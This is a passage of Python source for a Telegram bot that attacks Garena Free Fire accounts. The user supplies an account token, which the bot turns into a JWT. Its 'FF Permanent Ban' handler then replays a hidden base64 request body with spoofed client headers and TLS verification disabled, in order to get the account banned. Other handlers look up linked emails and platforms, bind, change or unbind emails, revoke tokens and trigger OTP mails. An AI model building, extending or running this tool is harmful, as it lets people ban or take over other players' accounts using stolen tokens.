                    res = MajorLoginRes()
                    res.ParseFromString(r.content)
                    if res.token:
                        return res.token, None
            except:
                continue
    except:
        pass
    return None, "MajorLogin failed - Token expired or Invalid. Try new token from https://zevricplayx.github.io/eat_token/"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        return json.loads(decoded_bytes.decode('utf-8'))
    except:
        return {}

def trigger_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
    }
    body_bytes = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body_bytes, timeout=20, verify=False)

def decode_ff_name(encoded_name):
    try:
        return base64.b64decode(encoded_name).decode('utf-8', errors='ignore')
    except:
        return encoded_name

def generate_username(length=12):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

# ===== 3 NEW PREMIUM HANDLERS =====
async def ff_ban_start(update, context):
    await update.message.reply_text("💀 𝐅𝐅 𝐏𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭 𝐁𝐚𝐧 💀🔥\n\n🔐 𝐄𝐧𝐭𝐞𝐫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐓𝐨𝐤𝐞𝐧 / 𝐉𝐖𝐓 💎\n⚠️ 𝐘𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐛𝐚𝐧 𝐡𝐨 𝐣𝐚𝐲𝐞𝐠𝐚! 💀", reply_markup=get_main_keyboard())
    return FF_BAN_TOKEN

async def ff_ban_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token = update.message.text.strip()
    if len(token) < 10:
        await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐨𝐤𝐞𝐧! 😔", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    msg = await update.message.reply_text("🔐 𝐀𝐮𝐭𝐡𝐞𝐧𝐭𝐢𝐜𝐚𝐭𝐢𝐧𝐠... ⏳💎")
    try:
        def do_auth():
            return fetch_majorlogin_jwt(token)
        jwt_token, err = await asyncio.to_thread(do_auth)
        if not jwt_token:
            await msg.edit_text(f"❌ 𝐀𝐮𝐭𝐡 𝐅𝐚𝐢𝐥𝐞𝐝! 😔\n{err}")
            return ConversationHandler.END
        data = decode_jwt(jwt_token)
        nick = decode_ff_name(data.get('nickname',''))
        region = data.get('lock_region', data.get('region','IND'))
        uid = data.get('account_id','Unknown')
        context.user_data['ff_jwt'] = jwt_token
        context.user_data['ff_version'] = data.get('release_version','Latest')
        context.user_data['ff_nick'] = nick
        context.user_data['ff_uid'] = uid
        context.user_data['ff_region'] = region
        await msg.edit_text(f"✅ 𝐓𝐨𝐤𝐞𝐧 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐞𝐝 🎯💎\n\n👤 𝐍𝐢𝐜𝐤: {nick} ✨\n🆔 𝐔𝐈𝐃: {uid} 🔥\n🌍 𝐑𝐞𝐠𝐢𝐨𝐧: {region} 🌐\n\n⚠️ 𝐊𝐲𝐚 𝐁𝐚𝐧 𝐤𝐚𝐫𝐧𝐚 𝐡𝐚𝐢? 💀")
        await update.message.reply_text("❓ 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 𝐊𝐚𝐫𝐨 👇", reply_markup=get_ban_confirm_keyboard())
        return FF_BAN_CONFIRM
    except Exception as e:
        await msg.edit_text(f"❌ 𝐄𝐫𝐫𝐨𝐫: {e} 😔")
        return ConversationHandler.END

async def ff_ban_confirm(update, context):
    txt = update.message.text.strip().lower()
    if "no" in txt or "cancel" in txt or "❌" in txt:
        await update.message.reply_text("🚫 𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝! 𝐁𝐚𝐧 𝐧𝐚𝐡𝐢 𝐡𝐮𝐚 😊✨", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if "yes" in txt or "ban" in txt or "✅" in txt:
        msg = await update.message.reply_text("💉 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐧𝐠 𝐀𝐏𝐈... ⏳💀🔥", reply_markup=get_main_keyboard())
        try:
            jwt_token = context.user_data.get('ff_jwt')
            version = context.user_data.get('ff_version','Latest')
            nick = context.user_data.get('ff_nick','Unknown')
            uid = context.user_data.get('ff_uid','Unknown')
            region = context.user_data.get('ff_region','IND')
            def do_inject():
                return trigger_injection(jwt_token, version)
            resp = await asyncio.to_thread(do_inject)
            if resp.status_code == 200:
                await msg.edit_text(f"🎉 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐁𝐀𝐍𝐍𝐄𝐃 🎉💀🔥💎✨\n\n👤 𝐍𝐢𝐜𝐤: {nick} ✨💎\n🆔 𝐔𝐈𝐃: {uid} 🔥✨\n🌍 𝐑𝐞𝐠𝐢𝐨𝐧: {region} 🌐💎\n💀 𝐒𝐭𝐚𝐭𝐮𝐬: 𝟏𝟎𝟎% 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓𝐋𝐘 𝐁𝐀𝐍𝐍𝐄𝐃 💀🔥\n\n✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐁𝐚𝐧𝐧𝐞𝐝! 💀🎉\n👑 @just_zevric 💎🔥")
            else:
                await msg.edit_text(f"❌ 𝐁𝐚𝐧 𝐅𝐚𝐢𝐥! 😔💔\n📊 𝐒𝐭𝐚𝐭𝐮𝐬: {resp.status_code} ⚠️\n🔑 𝐓𝐨𝐤𝐞𝐧 𝐄𝐱𝐩𝐢𝐫𝐞! 🚀\n👑 @just_zevric 💎")
        except Exception as e:
            await msg.edit_text(f"❌ 𝐄𝐫𝐫𝐨𝐫: {e} 😔")
        return ConversationHandler.END
    await update.message.reply_text("❓ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐨𝐨𝐬𝐞 ✅ Yes 𝐨𝐫 ❌ No", reply_markup=get_ban_confirm_keyboard())
    return FF_BAN_CONFIRM

async def resubscribe_start(update, context):
    await update.message.reply_text("Resubscribe OTP - ONLY EMAIL - REAL FIXED - Enter Email - Ex: your@gmail.com - Real Endpoint authgop - ONLY EMAIL No Token", reply_markup=get_main_keyboard())
    return RESUB_EMAIL

async def resubscribe_email(update, context):
    if update.message.text in ["🔍 Check Platform","💀 FF Permanent Ban","📧 Resubscribe OTP","👑 Owner Info","🔍 Bind Info Check","📧 Bind Email","🔄 Change Bind Email","❌ Unbind Email","⏱️ Cancel Request","🔑 EAT to Token","🚪 Revoke Token","📝 Update Bio","🌐 EAT Website"]:
        return await switch_menu(update, context)
    email=update.message.text.strip()
    if "@" not in email or "." not in email:
        await update.message.reply_text("Invalid Email! Ex: your@gmail.com", reply_markup=get_main_keyboard())
        return RESUB_EMAIL
    masked=mask_email(email)
    msg=await update.message.reply_text(f"Sending OTP to {masked}... Real Endpoint - No Captcha Fixed - ONLY EMAIL No Token!")
    try:
        def send_otp():
            return resubscribe_otp_sender_real(email, None)
        success, message=await asyncio.to_thread(send_otp)
        if success:
            await msg.edit_text(f"SUCCESS - Email: {masked} - {message} - Check Inbox Spam - No Captcha Fixed - @just_zevric ONLY EMAIL")
        else:
            if "error_email_used" in message:
                await msg.edit_text(f"Email Already Used - REAL FIX - Email {masked} already registered! REAL REASON: Email already in Garena DB, authgop OTP nahi bhejta! Solutions: 1. NEW email use karo jo kabhi register nahi hua 2. your@gmail.com already used 3. Naya email banao @just_zevric")
            else:
                await msg.edit_text(f"Failed: {message} @just_zevric")
    except Exception as e:
        await msg.edit_text(f"Error: {e}")
    return ConversationHandler.END

async def resubscribe_token(update, context):
    return await resubscribe_email(update, context)

async def platform_start(update, context):
    await update.message.reply_text("🔍 𝐂𝐡𝐞𝐜𝐤 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 🌐💎\n\n🔐 𝐄𝐧𝐭𝐞𝐫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐓𝐨𝐤𝐞𝐧: 💎", reply_markup=get_main_keyboard())
    return PLATFORM_TOKEN

async def platform_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token = update.message.text.strip()
    if len(token) < 10:
        await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐨𝐤𝐞𝐧! 😔", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    msg = await update.message.reply_text("🔍 𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦... ⏳🌐")
    try:
        def fetch():
            url = "https://100067.connect.garena.com/bind/app/platform/info/get"
            return make_request("GET", url, params={'access_token': token}, headers={'User-Agent': "GarenaMSDK/4.0.19P9"})
        r = await asyncio.to_thread(fetch)
        if r.status_code not in [200,201]:
            await msg.edit_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝! {r.status_code} 😔")
            return ConversationHandler.END
        j = r.json()
        m = {3: "Facebook 📘", 8: "Gmail 📧", 10: "iCloud 🍎", 5: "VK 🔵", 11: "Twitter 🐦", 7: "Huawei 🔴"}
        b = j.get("bounded_accounts", [])
        a = j.get("available_platforms", [])
        txt = f"🎉 𝐏𝐋𝐀𝐓𝐅𝐎𝐑𝐌 𝐂𝐇𝐄𝐂𝐊 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 🎉🌐💎✨\n\n"
        found=False
        for x in b:
            try:
                p=x.get('platform'); uinfo=x.get('user_info',{}); e=uinfo.get('email',''); n=uinfo.get('nickname','')
                if p in m:
                    txt+=f"✅ {m[p]} ✨\n"
                    if e: txt+=f"   📧 {e}\n"
                    if n: txt+=f"   👤 {n}\n"
                    txt+="\n"
                    found=True
            except: continue
        if not found:
            txt+="❌ 𝐍𝐨 𝐒𝐞𝐜𝐨𝐧𝐝𝐚𝐫𝐲 𝐋𝐢𝐧𝐤𝐬 𝐅𝐨𝐮𝐧𝐝! 😔💔\n\n"
        for k in m:
            if k not in a:
                txt+=f"👑 𝐌𝐚𝐢𝐧: {m[k]} 💎\n"
                break
        txt+=f"\n👑 @just_zevric 💎"
        await msg.edit_text(txt)
    except Exception as e:
        await msg.edit_text(f"❌ 𝐄𝐫𝐫𝐨𝐫: {e} 😔")
    return ConversationHandler.END


async def switch_menu(update, context):
    text=update.message.text.strip()
    if text == "🔍 Bind Info Check":
        context.user_data.clear()
        return await check_info_start(update, context)
    elif text == "📧 Bind Email":
        context.user_data.clear()
        return await bind_email_start(update, context)
    elif text == "🔄 Change Bind Email":
        context.user_data.clear()
        return await change_email_start(update, context)
    elif text == "❌ Unbind Email":
        context.user_data.clear()
        return await unbind_email_start(update, context)
    elif text == "⏱️ Cancel Request":
        context.user_data.clear()
        return await cancel_bind_start(update, context)
    elif text == "🔑 EAT to Token":
        context.user_data.clear()
        return await eat_to_token_start(update, context)
    elif text == "🚪 Revoke Token":
        context.user_data.clear()
        return await revoke_token_start(update, context)
    elif text == "📝 Update Bio":
        context.user_data.clear()
        return await bio_start(update, context)
    elif text == "💀 FF Permanent Ban":
        context.user_data.clear()
        return await ff_ban_start(update, context)
    elif text == "📧 Resubscribe OTP":
        context.user_data.clear()
        return await resubscribe_start(update, context)
    elif text == "🔍 Check Platform":
        context.user_data.clear()
        return await platform_start(update, context)
    elif text == "👑 Owner Info":
        await owner_info(update, context)
        return ConversationHandler.END
    elif text == "🌐 EAT Website":
        await eat_website_info(update, context)
        return ConversationHandler.END
    return ConversationHandler.END


def main():
    print("🚀 ZEVRIC V65 FIXED - 12 Features - FF Ban + Resubscribe + Platform + Success ✅")
    app=Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", force_start), group=0)
    conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex(P_BIND_INFO), check_info_start),
            MessageHandler(filters.Regex(P_BIND_EMAIL), bind_email_start),
            MessageHandler(filters.Regex(P_CHANGE), change_email_start),
            MessageHandler(filters.Regex(P_UNBIND), unbind_email_start),
            MessageHandler(filters.Regex(P_CANCEL), cancel_bind_start),
            MessageHandler(filters.Regex(P_EAT), eat_to_token_start),
            MessageHandler(filters.Regex(P_REVOKE), revoke_token_start),
            MessageHandler(filters.Regex(P_BIO), bio_start),
            MessageHandler(filters.Regex(P_FF_BAN), ff_ban_start),
            MessageHandler(filters.Regex(P_RESUB), resubscribe_start),
            MessageHandler(filters.Regex(P_PLATFORM), platform_start),
        ],
        states={
            CHECK_INFO: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, check_info_token)],
            BIND_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_token)],
            BIND_EMAIL: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_email)],
            BIND_OTP: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_otp)],
            BIND_SEC: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_security_code)],
            CHANGE_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_token)],
            CHANGE_OTP_OLD: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_otp_old)],
            CHANGE_NEW: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_new)],
            CHANGE_OTP_NEW: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_otp_new)],
            CHANGE_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_confirm)],
            UNBIND_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_token)],
            UNBIND_OTP: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_otp)],
            UNBIND_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_confirm)],
            CANCEL_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_bind_token)],
            CANCEL_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_bind_confirm)],
            EAT_INPUT: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, eat_to_token_convert)],
            REVOKE_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_token_verify)],
            REVOKE_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_token_confirm)],
            BIO_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_token)],
            BIO_TEXT: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_text)],
            BIO_COLOR: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_color)],
            BIO_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_confirm)],
            FF_BAN_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ff_ban_token)],
            FF_BAN_CONFIRM: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ff_ban_confirm)],
            RESUB_EMAIL: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, resubscribe_email)],
            RESUB_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, resubscribe_token)],
            PLATFORM_TOKEN: [MessageHandler(filters.Regex(ALL_MENU), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, platform_token)],
        },
        fallbacks=[CommandHandler("start", force_start), MessageHandler(filters.Regex(ALL_MENU), switch_menu)],
        conversation_timeout=600,
        allow_reentry=True
    )
    app.add_handler(conv)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Regex(P_OWNER), owner_info))
    app.add_handler(MessageHandler(filters.Regex(P_WEBSITE), eat_website_info))
    print("✅ V65 FIXED - 12 Features - Ready - No Crash 💀📧🔍")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__=="__main__": main()
